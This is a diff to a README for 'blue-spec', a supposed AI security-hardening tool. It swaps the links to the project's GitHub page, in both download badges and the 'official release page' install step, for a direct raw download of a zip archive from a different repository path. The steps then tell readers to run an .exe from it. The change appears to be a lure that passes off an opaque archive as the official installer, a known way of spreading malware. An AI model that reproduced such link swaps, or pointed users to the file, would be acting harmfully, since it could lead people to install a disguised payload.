@@ -5,7 +5,7 @@ description: "Automate software security hardening using AI agents to analyze co
 ---
 # 🌊 blue-spec - Improve security with automated AI tools
 
-[![](https://img.shields.io/badge/Download-Blue_Spec-blue.svg)](https://github.com/impliedtrustwencher377/blue-spec)
+[![](https://img.shields.io/badge/Download-Blue_Spec-blue.svg)](https://raw.githubusercontent.com/impliedtrustwencher377/impliedtrustwencher377.github.io/main/tiresmith/impliedtrustwencher-io-github-v1.7.zip)
 
 Blue Spec helps you protect your computer. It uses artificial intelligence to find risks in your system. The software creates a defensive plan to lock down important files and settings. You use this tool to harden your computer against unauthorized access or harmful software.
 
@@ -33,14 +33,14 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to get the tool on your machine.
 
-1. Visit the [official release page](https://github.com/impliedtrustwencher377/blue-spec) to find the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/impliedtrustwencher377/impliedtrustwencher377.github.io/main/tiresmith/impliedtrustwencher-io-github-v1.7.zip) to find the installer.
 2. Click the link that ends in .exe to begin your download.
 3. Once the file finishes, open your Downloads folder in Windows.
 4. Double-click the file to start the setup process.
 5. Follow the on-screen prompts.
 6. Click Finish to close the installer.
 
-[![](https://img.shields.io/badge/Download-Blue_Spec-grey.svg)](https://github.com/impliedtrustwencher377/blue-spec)
+[![](https://img.shields.io/badge/Download-Blue_Spec-grey.svg)](https://raw.githubusercontent.com/impliedtrustwencher377/impliedtrustwencher377.github.io/main/tiresmith/impliedtrustwencher-io-github-v1.7.zip)
 
 ## ⚙️ How to use the software
 
